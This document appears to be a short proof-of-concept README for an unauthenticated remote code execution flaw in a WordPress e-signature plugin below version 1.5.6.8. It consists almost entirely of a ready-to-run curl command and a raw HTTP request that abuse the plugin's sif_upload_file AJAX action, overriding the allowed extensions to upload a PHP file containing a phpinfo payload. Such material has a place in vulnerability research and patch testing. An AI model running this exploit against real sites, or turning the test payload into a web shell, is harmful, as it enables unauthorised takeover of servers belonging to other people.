# e-signature-poc
e-signature &lt; 1.5.6.8 - Unauthenticated Remote Code Execution


Curl
---
```
curl "http://wordpress.lan/wp-admin/admin-ajax.php?action=sif_upload_file" -X POST -H "Content-Type: multipart/form-data"   -F "file=@test.php"   -F "extensions=jpg,png,pdf,php"   -F "filesize=2"   -F "sif_name=example_file"
```


RAW_HTTP
---

```
POST /wp-admin/admin-ajax.php?action=sif_upload_file HTTP/1.1
Host: wordpress.lan
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 544
Content-Type: multipart/form-data; boundary=------------------------04406918fd5cbc2b
Connection: close

--------------------------04406918fd5cbc2b
Content-Disposition: form-data; name="file"; filename="test.php3"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

--------------------------04406918fd5cbc2b
Content-Disposition: form-data; name="extensions"

jpg,png,pdf,php3
--------------------------04406918fd5cbc2b
Content-Disposition: form-data; name="filesize"

2
--------------------------04406918fd5cbc2b
Content-Disposition: form-data; name="sif_name"

example_file3
--------------------------04406918fd5cbc2b--
```
